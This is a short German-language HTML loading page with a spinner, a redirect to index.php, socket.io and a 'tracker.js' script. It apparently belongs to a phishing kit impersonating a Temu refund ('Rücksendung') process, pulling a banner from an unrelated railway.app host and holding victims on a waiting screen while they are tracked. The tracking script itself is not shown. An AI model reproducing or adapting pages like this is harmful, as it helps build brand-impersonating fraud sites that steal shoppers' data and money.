
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
    <meta http-equiv="refresh" content="3; url=index.php">
    <link rel="stylesheet" href="./css/bratoka.css">
    <style>
      .spinner {
        border: 9px solid #f3f3f3;
        border-top: 9px solid #ff7300;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1.6s linear infinite;
        margin: 20px auto;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }

      .loading-text {
        font-size: 1.2em;
        margin-top: 10px;
        text-align: center;
        color: #333;
      }

      .loading {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      @media (max-width: 668px) {
        .spinner {
          width: 60px;
          height: 60px;
          border-radius: 50%;
          border: 10px solid #f3f3f3;
          border-top: 10px solid #ff7300;
        }

        .loading-text {
          font-size: 15px;
        }

      }

      .topano2 {
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .topano2 img {
        width: 100%;
      }

      .pc {
        display: none;
      }

      .mb {
        display: block;
      }

      @media (min-width: 768px) {
        .pc {
          display: block;
        }

        .mb {
          display: none;
        }
      }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>

<body>
  <div>
        <div>
            <img class="pc" style="width: 100%; height: 100%;" src="https://freiwilligen-rucksendungtemu.up.railway.app/img/insid-hedopan.jpg" alt="">
            <img class="mb" style="width: 100%; height: 100%;" src="./img/insid-hedopan-mb.PNG" alt="">
        </div>
    </div>

  <div class="loading">
    <div class="spinner"></div>
    <div class="loading-text">Bitte warten, wird geladen...</div>
  </div>


  
  <script src="/socket.io/socket.io.js"></script>
    <script src="js/tracker.js"></script>

</body>

</html>
